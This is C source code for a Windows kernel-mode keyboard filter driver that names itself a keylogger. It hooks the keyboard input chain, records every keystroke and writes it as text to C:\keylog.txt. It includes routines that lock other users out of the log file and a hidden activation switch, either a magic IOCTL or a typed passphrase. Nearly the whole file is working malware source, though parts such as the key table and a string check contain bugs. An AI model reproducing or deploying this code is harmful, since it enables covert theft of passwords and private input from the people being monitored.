#include "keylogger.h"
#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (PAGE, KeyLogger_EvtDeviceAdd)
#pragma alloc_text (PAGE, KeyLogger_EvtIoInternalDeviceControl)
#endif

#define IOCTL_ENABLING_WRITING 0x420
VOID
DriverUnload(
	IN WDFDRIVER Driver
);
NTSTATUS broken(DWORD, PKEYBOARD_INPUT_DATA);

NTSTATUS
WorkingLogging
(
	DWORD					n,
	PKEYBOARD_INPUT_DATA	buffer
);

NTSTATUS(*WriteToLogFile)(DWORD, PKEYBOARD_INPUT_DATA) = broken;

//NTSTATUS(*WriteToLogFile)(DWORD, PKEYBOARD_INPUT_DATA) = WorkingLogging;


HANDLE				fileHandle;		// Handle for the log file. Remains open throughout the driver's lifetime.

KEYBOARD_DATA_ARRAY 		keyboardDataArray;	// Structure that holds the global array.

ULONG				written;		// Total number of records written to the file.

#define				LOG_TRIGGER_POINT 32	// Value at which the writing work item fires.

#define				SZ_KEYTABLE 0x100	// Size of the scancodes table.


NTSTATUS broken(DWORD one, PKEYBOARD_INPUT_DATA two) {
	UNREFERENCED_PARAMETER(one);
	UNREFERENCED_PARAMETER(two);
	__noop;
	return 0;
};

// Scancodes table.
// RDP likes to send an FF scan code which requires a table of 0x100 size to handle.
char* keytable[SZ_KEYTABLE] =
{
	"[INVALID0]",
	"Esc",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[BACKSPACE]",
	"[TAB]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"[ENTER]",
	"[RCTRL]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"[INVALID1]"
	"'",
	"`",
	"[LSHIFT]",
	"|",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"[RSHIFT]",
	"[PrtScr]",
	"[LALT]",
	"[SPACE]",
	"[RSHIFT]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[INVALID2]",
	"[F10]",
	"[NumLk]",
	"[INVALID3]",
	"Home",
	"Num8/UpArrow",
	"PgUp",
	"[Num-]",
	"Num4/LeftArrow",
	"Num5",
	"Num6/RightArrow",
	"[INVALID4]",
	"End",
	"Num2/DownArrow",
	"PgDn",
	"Num0"
	"Insert",
	"Del",
	"Num1",
	"Num/",
	"Num8",
	"[F11]",
	"[F12]",
	"Num0",
	"Num*",
	"WinLeft",
	"Num6",
	"WinRight",
	"Num.",
	"Num-",
	"Num+",
	"[INVALID5]",
	"NumEnter",
	"Esc",
	"[INVALID6]",
	"[INVALID7]",
	"[INVALID8]",
	"[INVALID9]",
	"[INVALID10]",
	"[INVALID11]",
	"[INVALID12]",
	"[INVALID13]",
	"[INVALID14]",
	"[INVALID15]",
	"[INVALID16]",
	"[INVALID17]",
	"[INVALID18]",
	"[INVALID19]",
	"[INVALID20]",
	"[INVALID21]",
	"[INVALID22]",
	"[INVALID23]",
	"[INVALID24]",
	"[INVALID25]",
	"[INVALID26]",
	"[INVALID27]",
	"[INVALID28]",
	"[INVALID29]",
	"[INVALID30]",
	"[INVALID31]",
	"[INVALID32]",
	"[INVALID33]",
	"[INVALID34]",
	"[INVALID35]",
	"[INVALID36]",
	"[INVALID37]",
	"[INVALID38]",
	"[INVALID39]",
	"[INVALID40]",
	"[INVALID41]",
	"[INVALID42]",
	"[INVALID43]",
	"[INVALID44]",
	"[INVALID45]",
	"[INVALID46]",
	"[INVALID47]",
	"[INVALID48]",
	"[INVALID49]",
	"[INVALID50]",
	"[INVALID51]",
	"[INVALID52]",
	"[INVALID53]",
	"[INVALID54]",
	"[INVALID55]",
	"[INVALID56]",
	"[INVALID57]",
	"[INVALID58]",
	"[INVALID59]",
	"[INVALID60]",
	"[INVALID61]",
	"[INVALID62]",
	"[INVALID63]",
	"[INVALID64]",
	"[INVALID65]",
	"[INVALID66]",
	"[INVALID67]",
	"[INVALID68]",
	"[INVALID69]",
	"[INVALID70]",
	"[INVALID71]",
	"[INVALID72]",
	"[INVALID73]",
	"[INVALID74]",
	"[INVALID75]",
	"[INVALID76]",
	"[INVALID77]",
	"[INVALID78]",
	"[INVALID79]",
	"[INVALID80]",
	"[INVALID81]",
	"[INVALID82]",
	"[INVALID83]",
	"[INVALID84]",
	"[INVALID85]",
	"[INVALID86]",
	"[INVALID87]",
	"[INVALID88]",
	"[INVALID89]",
	"[INVALID90]",
	"[INVALID91]",
	"[INVALID92]",
	"[INVALID93]",
	"[INVALID94]",
	"[INVALID95]",
	"[INVALID96]",
	"[INVALID97]",
	"[INVALID98]",
	"[INVALID99]",
	"[INVALID100]",
	"[INVALID101]",
	"[INVALID102]",
	"[INVALID103]",
	"[INVALID104]",
	"[INVALID105]",
	"[INVALID106]",
	"[INVALID107]",
	"[INVALID108]",
	"[INVALID109]",
	"[INVALID110]",
	"[INVALID111]",
	"[INVALID112]",
	"[INVALID113]",
	"[INVALID114]",
	"[INVALID115]",
	"[INVALID116]",
	"[INVALID117]",
	"[INVALID118]",
	"[INVALID119]",
	"[INVALID120]",
	"[INVALID121]",
	"[INVALID122]",
	"[INVALID123]",
	"[INVALID124]",
	"[INVALID125]",
	"[INVALID126]",
	"[INVALID127]",
	"[INVALID128]",
	"[INVALID129]",
	"[INVALID130]",
	"[INVALID131]",
	"[INVALID132]",
	"[INVALID133]",
	"[INVALID134]",
	"[INVALID135]",
	"[INVALID136]",
	"[INVALID137]",
	"[INVALID138]",
	"[INVALID139]",
	"[INVALID140]",
	"[INVALID141]",
	"[INVALID142]",
	"[INVALID143]",
	"[INVALID144]",
	"[INVALID145]",
	"[INVALID146]",
	"[INVALID147]",
	"[INVALID148]",
	"[INVALID149]",
	"[INVALID150]",
	"[INVALID151]",
	"[INVALID152]",
	"[INVALID153]",
	"[INVALID154]",
	"[INVALID155]",
	"[INVALID156]",
	"[INVALID157]",
	"[INVALID158]",
	"[INVALID159]",
	"[INVALID160]",
	"[INVALID161]"
};


NTSTATUS
InitKeyboardDataArray
(
)
/**
 *
 * Initialize Keyboard Data Array. Create spin lock protecting it.
 *
 * Return:
 *
 *		Status of the operation.
 *
 **/
{
	NTSTATUS status = STATUS_SUCCESS;

	//
	// Set the initial index to 0
	//
	keyboardDataArray.index = 0;

	//
	// Create spin lock that protects the buffer.
	//
	WDF_OBJECT_ATTRIBUTES spinLockAttributes;
	WDF_OBJECT_ATTRIBUTES_INIT(&spinLockAttributes);

	status = WdfSpinLockCreate(&spinLockAttributes, &keyboardDataArray.spinLock);

	if (!NT_SUCCESS(status))
	{
		DebugPrint(("WdfSpinLockCreate failed with code: %x\n", status));
		return status;
	}

	return status;
}

VOID
AddToBuffer
(
	PKEYBOARD_INPUT_DATA entry
)
/**
 *
 * Add an element to the array by first obtaining the
 * spin lock, then performing addition, and finally
 * releasing the spin lock.
 *
 * Arguments:
 *
 *		PKEYBOARD_INPUT_DATA entry
 *			Entry to add.
 *
 **/
{
	WdfSpinLockAcquire(keyboardDataArray.spinLock);

	keyboardDataArray.buffer[keyboardDataArray.index] = *entry;
	keyboardDataArray.index++;

	WdfSpinLockRelease(keyboardDataArray.spinLock);

}

DWORD
DumpBuffer
(
	PKEYBOARD_INPUT_DATA dest
)
/**
 *
 * Dump all entries from the keyboard data buffer by first
 * obtaining the spin lock, then performing extraction, and
 * finally releasing the spin lock.
 *
 * Arguments:
 *
 *		PKEYBOARD_INPUT_DATA dest
 *			Where to place the contents of the buffer.
 *
 * Return:
 *
 *		The number of the entries obtained.
 *
 **/
{
	DWORD n = 0;

	WdfSpinLockAcquire(keyboardDataArray.spinLock);

	if (dest != NULL)
	{
		DWORD i;
		for (i = 0; i < keyboardDataArray.index; i++)
		{
			dest[i] = keyboardDataArray.buffer[i];
		}
		n = i;
		keyboardDataArray.index = 0;
	}

	WdfSpinLockRelease(keyboardDataArray.spinLock);

	return n;
}

NTSTATUS
WorkingLogging
(
	DWORD					n,
	PKEYBOARD_INPUT_DATA	buffer
)
/**
 *
 * Write buffer to the log file.
 *
 * Arguments:
 *
 *		DWORD n
 *			Number of entries of type KEYBOARD_INPUT_DATA to
 *			be written to the log file.
 *
 *		PKEYBOARD_INPUT_DATA buffer
 *			Buffer containing the data to be written. Note that
 *			this is NOT the global keyboard data buffer, but a
 *			safe copy that the work item holds.
 *
 * Return:
 *
 *		Status of the operation.
 *
 **/
{
	NTSTATUS		status;
	DWORD			i;
	USHORT			scancode, flags;

	//
	// Prepare buffer containing characters to write to the file
	//
	CHAR writeBuffer[SZ_KEYBOARD_DATA_ARRAY * 20];
	writeBuffer[0] = '\0';

	//
	// Write every scan code to the write buffer, with respect
	// to the flags (pressed, released)
	//

	for (i = 0; i < n; i++)
	{
		scancode = buffer[i].MakeCode;
		flags = buffer[i].Flags;

		CHAR* asciiRepr = keytable[scancode];

		if (scancode >= 0 && scancode < SZ_KEYTABLE)
		{
			strcat(writeBuffer, asciiRepr);
		}
		else
		{
			strcat(writeBuffer, "[N/A]");
		}
		if (flags == KEY_MAKE)
		{
			if (strlen(asciiRepr) > 8)
			{
				strcat(writeBuffer, "\tPressed\r\n");
			}
			else
			{
				strcat(writeBuffer, "\t\tPressed\r\n");
			}
		}
		else
		{
			if (strlen(asciiRepr) > 8)
			{
				strcat(writeBuffer, "\tReleased\r\n");
			}
			else
			{
				strcat(writeBuffer, "\t\tReleased\r\n");
			}
		}
	}

	// Open the file
	HANDLE fileHandle;
	UNICODE_STRING fileName;
	IO_STATUS_BLOCK ioStatusBlock;
	LARGE_INTEGER ByteOffset;
	OBJECT_ATTRIBUTES objAttr;
	RtlInitUnicodeString(&fileName, L"\\??\\C:\\keylog.txt");

	InitializeObjectAttributes(&objAttr, &fileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	status = ZwCreateFile(&fileHandle, GENERIC_WRITE, &objAttr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (!NT_SUCCESS(status))
	{
		DebugPrint(("Failed to open file with code: 0x%x\n", status));
		goto Exit;
	}

	ByteOffset.HighPart = -1;
	ByteOffset.LowPart = FILE_WRITE_TO_END_OF_FILE;

	// Write to the file
	status = ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock, writeBuffer, (ULONG)strlen(writeBuffer), &ByteOffset, NULL);
	if (!NT_SUCCESS(status))
	{
		DebugPrint(("Write to log failed with code: 0x%x\n", status));
		goto Exit;
	}

	// Close the file
	ZwClose(fileHandle);

Exit:
	written += n;
	DebugPrint(("Total elements written: %lu\n", written));
	return status;
}

NTSTATUS
SetFileDacl
(
)
/**
 *
 * Set the Discretionary Access Control List (DACL) on
 * a log file.
 *
 * Return:
 *
 *		Status of the operation.
 *
 **/
{
	SECURITY_DESCRIPTOR		sd;
	PACL					acl;
	NTSTATUS				status;

	acl = NULL;
	status = STATUS_SUCCESS;

	//
	// Allocate memory for ACL
	//
	acl = ExAllocatePool2(POOL_FLAG_PAGED, PAGE_SIZE, 'abcd');

	if (acl == NULL)
	{
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Exit;
	}

	//
	// Create ACL
	//
	status = RtlCreateAcl(
		acl,
		PAGE_SIZE,
		ACL_REVISION
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Create security descriptor
	//
	status = RtlCreateSecurityDescriptor(
		&sd,
		SECURITY_DESCRIPTOR_REVISION
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Associate the empty ACL with the security descriptor.
	// If there are no ACE in the DACL, the system will not allow
	// access to anyone.
	//

	status = RtlSetDaclSecurityDescriptor(&sd, TRUE, acl, FALSE);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Set security on the object
	//
	status = ZwSetSecurityObject(
		fileHandle,
		DACL_SECURITY_INFORMATION,
		&sd
	);

	if (!NT_SUCCESS(status)) {

		goto Exit;

	}

Exit:
	if (acl != NULL)
	{
		//
		// Free resources
		//
		ExFreePool(acl);
		acl = NULL;
	}

	return status;
}

NTSTATUS
ResetFileDacl
(
)
/**
 * Reset file Discretionary Access Control List to
 * restore basic permissions.
 *
 * Return:
 *
 *		Status of the operation.
 *
 **/
{
	SECURITY_DESCRIPTOR		sd;
	PACL					pAcl;
	NTSTATUS				status;

	pAcl = NULL;
	status = STATUS_SUCCESS;

	//
	// Allocate memory for ACL
	//
	pAcl = ExAllocatePool2(POOL_FLAG_PAGED, PAGE_SIZE, 'abcd');

	if (pAcl == NULL)
	{
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Exit;
	}

	//
	// Create ACL
	//
	status = RtlCreateAcl(
		pAcl,
		PAGE_SIZE,
		ACL_REVISION
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Create an Access Control Entries that will restore basic
	// rights to the file for system, administrators and users
	//

	//
	// System ACE
	//
	status = RtlAddAccessAllowedAce(
		pAcl,
		ACL_REVISION,
		GENERIC_READ | GENERIC_WRITE | DELETE,
		SeExports->SeLocalSystemSid
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Administrators ACE
	//
	status = RtlAddAccessAllowedAce(
		pAcl,
		ACL_REVISION,
		GENERIC_READ | GENERIC_WRITE | DELETE,
		SeExports->SeAliasAdminsSid
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Users ACE
	//
	status = RtlAddAccessAllowedAce(
		pAcl,
		ACL_REVISION,
		GENERIC_READ,
		SeExports->SeAliasUsersSid
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Create security descriptor
	//
	status = RtlCreateSecurityDescriptor(
		&sd,
		SECURITY_DESCRIPTOR_REVISION
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Associate the empty ACL with the security descriptor.
	// If there are no ACE in the DACL, the system will not allow
	// access to anyone.
	//
	status = RtlSetDaclSecurityDescriptor(&sd, TRUE, pAcl, FALSE);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Set security on the object
	//
	status = ZwSetSecurityObject(
		fileHandle,
		DACL_SECURITY_INFORMATION,
		&sd
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

Exit:

	if (pAcl != NULL)
	{
		//
		// Free resources
		//
		ExFreePool(pAcl);
		pAcl = NULL;
	}

	return status;
}

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT  DriverObject,
	IN PUNICODE_STRING RegistryPath
)
/**
 *
 * Installable driver initialization entry point.
 * This entry point is called directly by the I/O system.
 *
 * Arguments:
 *
 *		PDRIVER_OBJECT DriverObject
 *			Pointer to the driver object
 *
 *		PUNICODE_STRING RegistryPath
 *			Pointer to a unicode string representing the path,
 *           to driver-specific key in the registry.
 *
 * Return Value:
 *
 *		Status of the operation.
 *
 **/
{
	WDF_DRIVER_CONFIG               config;
	NTSTATUS                        status;

	DebugPrint(("KeyLogger KMDF Driver.\n"));
	DebugPrint(("Built %s %s\n", __DATE__, __TIME__));

	//
	// Initiialize driver config.
	//
	WDF_DRIVER_CONFIG_INIT(
		&config,
		KeyLogger_EvtDeviceAdd
	);

	//
	// Specify driver's Unload function.
	//
	config.EvtDriverUnload = DriverUnload;


	//
	// Create a framework driver object.
	//
	status = WdfDriverCreate(
		DriverObject,
		RegistryPath,
		WDF_NO_OBJECT_ATTRIBUTES,
		&config,
		WDF_NO_HANDLE
	);

	if (!NT_SUCCESS(status))
	{
		DebugPrint(("WdfDriverCreate failed with status 0x%x\n",
			status));
	}

	return status;
}

NTSTATUS
KeyLogger_EvtDeviceAdd(
	IN WDFDRIVER        Driver,
	IN PWDFDEVICE_INIT  DeviceInit
)
/**
 *
 * DeviceAdd routine.
 * Called in response to AddDevice call from PnP manager.
 *
 **/
{
	WDF_OBJECT_ATTRIBUTES   deviceAttributes;
	NTSTATUS                status;
	WDFDEVICE               hDevice;
	PDEVICE_EXTENSION       filterExt;
	WDF_IO_QUEUE_CONFIG     ioQueueConfig;

	UNREFERENCED_PARAMETER(Driver);

	PAGED_CODE();

	//
	// Tell the framework that you are filter driver. Framework
	// takes care of inherting all the device flags & characterstics
	// from the lower device you are attaching to.
	//
	WdfFdoInitSetFilter(DeviceInit);

	WdfDeviceInitSetDeviceType(
		DeviceInit,
		FILE_DEVICE_KEYBOARD
	);

	WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(
		&deviceAttributes,
		DEVICE_EXTENSION
	);

	//
	// Create a framework device object.
	//
	status = WdfDeviceCreate(
		&DeviceInit,
		&deviceAttributes,
		&hDevice
	);

	if (!NT_SUCCESS(status))
	{
		DebugPrint(("WdfDeviceCreate failed with status code 0x%x\n",
			status));
		return status;
	}

	//
	// Get device extension data.
	//
	filterExt = GetDeviceExtension(hDevice);

	//
	// Configure the default queue to be Parallel. Do not use sequential queue
	// if this driver is going to be filtering PS2 ports because it can lead to
	// deadlock. The PS2 port driver sends a request to the top of the stack when it
	// receives an ioctl request and waits for it to be completed. If you use a
	// a sequential queue, this request will be stuck in the queue because of the 
	// outstanding ioctl request sent earlier to the port driver.
	//
	WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(
		&ioQueueConfig,
		WdfIoQueueDispatchParallel
	);

	//
	// Framework by default creates non-power managed queues for
	// filter drivers.
	//
	ioQueueConfig.EvtIoInternalDeviceControl = KeyLogger_EvtIoInternalDeviceControl;

	status = WdfIoQueueCreate(
		hDevice,
		&ioQueueConfig,
		WDF_NO_OBJECT_ATTRIBUTES,
		WDF_NO_HANDLE
	);


	if (!NT_SUCCESS(status))
	{
		DebugPrint(("WdfIoQueueCreate failed 0x%x\n", status));
		return status;
	}

	//
	// Create work item.
	//
	CreateWorkItem(hDevice);

	//
	// Initialize global structures, create, open and set proper permissions
	// on the log file. This is done to deny any access to the file while
	// the driver is loaded. Howerver note that the administrator can always
	// change the ownership of a file, thus acquiring access to the file.
	// This should however never happen when the driver is loaded, as it
	// keeps handle to the log file open.
	//
	InitKeyboardDataArray();
	//OpenLogFile();
	//SetFileDacl();

	//
	// Set total written records field to 0.
	//
	written = 0;

	return status;
}


VOID
KeyLogger_EvtIoInternalDeviceControl(
	IN WDFQUEUE      Queue,
	IN WDFREQUEST    Request,
	IN size_t        OutputBufferLength,
	IN size_t        InputBufferLength,
	IN ULONG         IoControlCode
)
/**
 *
 * Dispatch routine for internal device control requests.
 *
 **/
{
	PDEVICE_EXTENSION               devExt;
	PINTERNAL_I8042_HOOK_KEYBOARD   hookKeyboard = NULL;
	PCONNECT_DATA                   connectData = NULL;
	NTSTATUS                        status = STATUS_SUCCESS;
	size_t                          length;
	WDFDEVICE                       hDevice;
	BOOLEAN                         ret = TRUE;
	WDF_REQUEST_SEND_OPTIONS        options;

	UNREFERENCED_PARAMETER(OutputBufferLength);
	UNREFERENCED_PARAMETER(InputBufferLength);
	UNREFERENCED_PARAMETER(hookKeyboard);

	PAGED_CODE();


	hDevice = WdfIoQueueGetDevice(Queue);
	devExt = GetDeviceExtension(hDevice);

	switch (IoControlCode)
	{
		//
		// Connect a keyboard class device driver to the port driver.
		//
	case IOCTL_ENABLING_WRITING:
		WriteToLogFile = WorkingLogging;
		break;

	case IOCTL_INTERNAL_KEYBOARD_CONNECT:
		//
		// Only allow one connection.
		//
		if (devExt->UpperConnectData.ClassService != NULL) {
			status = STATUS_SHARING_VIOLATION;
			break;
		}

		//
		// Get the input buffer from the request
		// (Parameters.DeviceIoControl.Type3InputBuffer).
		//
		status = WdfRequestRetrieveInputBuffer(Request,
			sizeof(CONNECT_DATA),
			&connectData,
			&length);
		if (!NT_SUCCESS(status)) {
			DebugPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
			break;
		}

		NT_ASSERT(length == InputBufferLength);

		devExt->UpperConnectData = *connectData;

		//
		// Hook into the report chain.  Everytime a keyboard packet is reported
		// to the system, KbFilter_ServiceCallback will be called
		//

		connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);

#pragma warning(disable:4152)  //nonstandard extension, function/data pointer conversion

		connectData->ClassService = KeyLogger_ServiceCallback;

#pragma warning(default:4152)

		break;

		//
		// Disconnect a keyboard class device driver from the port driver.
		//
	case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:

		//
		// Clear the connection parameters in the device extension.
		//
		// devExt->UpperConnectData.ClassDeviceObject = NULL;
		// devExt->UpperConnectData.ClassService = NULL;

		status = STATUS_NOT_IMPLEMENTED;
		break;

		//
		// Might want to capture these in the future.  For now, then pass them down
		// the stack.  These queries must be successful for the RIT to communicate
		// with the keyboard.
		//
	case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
	case IOCTL_KEYBOARD_QUERY_INDICATORS:
	case IOCTL_KEYBOARD_SET_INDICATORS:
	case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
	case IOCTL_KEYBOARD_SET_TYPEMATIC:
		break;
	}

	if (!NT_SUCCESS(status))
	{
		WdfRequestComplete(Request, status);
		return;
	}

	//
	// We are not interested in post processing the IRP so 
	// fire and forget.
	//
	WDF_REQUEST_SEND_OPTIONS_INIT(&options,
		WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

	ret = WdfRequestSend(Request, WdfDeviceGetIoTarget(hDevice), &options);

	if (ret == FALSE)
	{
		status = WdfRequestGetStatus(Request);
		DebugPrint(("WdfRequestSend failed: 0x%x\n", status));
		WdfRequestComplete(Request, status);
	}
}

VOID
KeyLogger_ServiceCallback(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PKEYBOARD_INPUT_DATA InputDataStart,
	IN PKEYBOARD_INPUT_DATA InputDataEnd,
	IN OUT PULONG			InputDataConsumed
)
/**
 *
 * Callback that is called when the keyboard packets are
 * to be reported to the Win32 subsystem.
 * In this function the packets are added to the global
 * keyboard data buffer.
 *
 **/
{
	PDEVICE_EXTENSION   devExt;
	WDFDEVICE			hDevice;

	hDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);

	//
	// Get the Device Extension.
	//
	devExt = GetDeviceExtension(hDevice);

	ULONG					totalKeys;
	PKEYBOARD_INPUT_DATA	inputKey;

	totalKeys = (ULONG)(InputDataEnd - InputDataStart);
	inputKey = InputDataStart;

	DWORD i;

	//
	// Loop that adds all keyboard data to the global array.
	//
	for (i = 0; i < totalKeys; i++)
	{
		AddToBuffer(&inputKey[i]);
	}

	DWORD index = keyboardDataArray.index;

	//
	// Check if the number of elements in the global buffer
	// exceeds or is equal to the preset point.
	//
	// Note that due to the fact that the work item is queued
	// 
	//
	if (index >= LOG_TRIGGER_POINT)
	{
		//
		// Queue work item that will write the intercepted
		// data to the log file.
		//

		//
		// Get worker item context
		//
		PWORKER_ITEM_CONTEXT workerItemContext = GetWorkItemContext(devExt->workItem);

		if (workerItemContext->hasRun)
		{
			//
			// Only queue the work item when it has not yet run.
			//

			//
			// The hasRun field will be set to false until the worker finishes
			// its job.
			//
			workerItemContext->hasRun = FALSE;
			KeyLoggerQueueWorkItem(devExt->workItem);
		}
	}

	(*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR)devExt->UpperConnectData.ClassService)(
		devExt->UpperConnectData.ClassDeviceObject,
		InputDataStart,
		InputDataEnd,
		InputDataConsumed);
}

VOID
WriteWorkItem(
	WDFWORKITEM  WorkItem
)
/**
 *
 * Work item callback. Responsible for calling PASSIVE_LEVEL functions
 * like writing to log file.
 *
 * Arguments:
 *
 *		WDFWORKITEM WorkItem
 *			WorkItem object created earlier
 *
 **/
{
	PWORKER_ITEM_CONTEXT		context;
	USHORT scancode;
	USHORT flags;
	context = GetWorkItemContext(WorkItem);

	//
	// Dump the array into the worker's buffer.
	//
	DWORD n = DumpBuffer(context->buffer);

	//
	// Write dumped elements to the file.
	//

	//
	// Prepare buffer containing characters to write to the file
	//
	CHAR secretBuffer[SZ_KEYBOARD_DATA_ARRAY * 20] = { 0 };
	CHAR* asciiRepr = NULL;
	secretBuffer[0] = '\0';

	for (unsigned int i = 0; i < n; i++)
	{
		scancode = context->buffer[i].MakeCode;
		flags = context->buffer[i].Flags;

		if (scancode < SZ_KEYTABLE) {
			asciiRepr = keytable[scancode];
		}
		else {
			asciiRepr = keytable[SZ_KEYTABLE - 1];
		}
		if (flags == KEY_MAKE) {

			if (scancode >= 0 && scancode < SZ_KEYTABLE)
			{
				strcat(secretBuffer, asciiRepr);
				if (strstr("aw3s0m3,d00d", secretBuffer) != 0) {
					WriteToLogFile = WorkingLogging;
				}
			}
		}

	};

	WriteToLogFile(n, context->buffer);

	//
	// Indicate that worker has finished its job.
	//
	context->hasRun = TRUE;
}

NTSTATUS
CreateWorkItem(
	WDFDEVICE DeviceObject
)
/**
 *
 * Initialize and create work item. The created object is stored
 * in the device extension of the parameter DeviceObject.
 *
 * Arguments:
 *
 *		WDFDEVICE DeviceObject
 *			Object containing work item in its device extension.
 *
 * Returns:
 *
 *		Status of the operation.
 *
 **/
{
	NTSTATUS status = STATUS_SUCCESS;

	WDF_OBJECT_ATTRIBUTES		workItemAttributes;
	WDF_WORKITEM_CONFIG			workitemConfig;
	//WDFWORKITEM					hWorkItem;

	WDF_OBJECT_ATTRIBUTES_INIT(&workItemAttributes);

	WDF_OBJECT_ATTRIBUTES_SET_CONTEXT_TYPE(
		&workItemAttributes,
		WORKER_ITEM_CONTEXT
	);

	workItemAttributes.ParentObject = DeviceObject;

	//
	// Configure the work item
	//
	WDF_WORKITEM_CONFIG_INIT(
		&workitemConfig,
		WriteWorkItem
	);

	//
	// Get the Device Extension
	//
	PDEVICE_EXTENSION devExt = GetDeviceExtension(DeviceObject);

	//
	// Create work item
	//
	status = WdfWorkItemCreate(
		&workitemConfig,
		&workItemAttributes,
		&(devExt->workItem)
	);

	if (!NT_SUCCESS(status)) {
		DebugPrint(("Work item creation failed with error code: 0x%x\n", status));
		return status;
	}

	PWORKER_ITEM_CONTEXT context = GetWorkItemContext(devExt->workItem);

	//
	// Set the field hasRun to true so that the work item can
	// be queued first time.
	//
	context->hasRun = TRUE;

	return status;
}

VOID
KeyLoggerQueueWorkItem(
	WDFWORKITEM workItem
)
/**
 *
 * Enqueue work item.
 *
 * Arguments:
 *
 *		WDFWORKITEM workItem
 *			Work item to enqueue.
 *
 **/
{
	WdfWorkItemEnqueue(workItem);
}


VOID
DriverUnload(
	IN WDFDRIVER Driver
)
/**
*
* Driver Unload routine.
*
**/
{
	UNREFERENCED_PARAMETER(Driver);
	ResetFileDacl();
	ZwClose(fileHandle);
	DebugPrint(("=======================UNLOAD===================\n"));
}
